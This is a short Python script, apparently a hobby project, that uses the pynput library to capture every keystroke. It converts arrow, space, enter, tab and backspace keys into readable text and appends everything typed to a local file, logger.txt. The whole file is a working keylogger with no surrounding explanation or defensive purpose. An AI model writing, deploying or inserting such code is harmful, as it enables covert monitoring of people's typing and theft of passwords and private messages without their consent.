from pynput.keyboard import Listener

def store_on_file(input):
    word = str(input)
    word = word.replace("'", "")

    if word == "Key.space":
        word = " "
    if word == "Key.up":
        word = "\nup arrow "
    if word == "Key.right":
        word = "\nright arrow "
    if word == "Key.left":
        word = "\nleft arrow "
    if word == "Key.down": 
        word = "\ndown arrow "
    if word == "Key.shift_r":
        word = ""
    if word == "Key.enter" :
        word = "\n"
    if word == "Key.tab":
        word = "    "
    if word == "Key.backspace":
        word = "\nbackspace button "

    with open("logger.txt", 'a') as f:
        f.write(word)

with Listener(on_press=store_on_file) as listener:
    listener.join()
